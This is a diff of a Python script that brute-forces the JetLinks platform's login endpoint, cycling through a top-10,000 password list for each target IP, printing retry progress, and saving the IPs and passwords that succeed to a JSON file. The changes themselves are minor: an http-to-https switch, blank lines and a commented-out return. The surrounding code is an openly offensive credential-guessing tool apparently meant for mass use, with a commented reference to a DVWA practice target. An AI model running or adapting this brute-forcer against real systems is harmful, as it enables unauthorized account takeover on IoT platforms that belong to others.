@@ -11,10 +11,11 @@ ip = "101.34.143.5:8888"  # localhost
 # url = "http://101.34.143.5:8888/vulnerabilities/brute/?username=admin&password=password&Login=Login"
 
 
-url = "http://192.168.19.185:9000/jetlinks/authorize/login"
+url = "https://192.168.19.185:9000/jetlinks/authorize/login"
 # res = requests.get(url,headers=headers)
 
 def test_vun(ip,passdir=''):
+
     url="http://{}/jetlinks/authorize/login".format(ip)
 
     with open('./somd5-top1w.txt', 'r') as f:
@@ -39,6 +40,7 @@ def test_vun(ip,passdir=''):
             if '密码' in resp.text:
                 if index%100==0: print('{} password incorrect,retrying {}'.format(ip,index))
                 continue
+                #return  False
             if resp.status_code==200:
                 return {'ip':ip,'password':password}
             else:
@@ -73,5 +75,7 @@ def main():
     with open('./data/res.json','w') as f:
         print('total success{}'.format(len(success_ip)))
         json.dump(success_ip,f)
+
+
 if __name__ == '__main__':
     main()
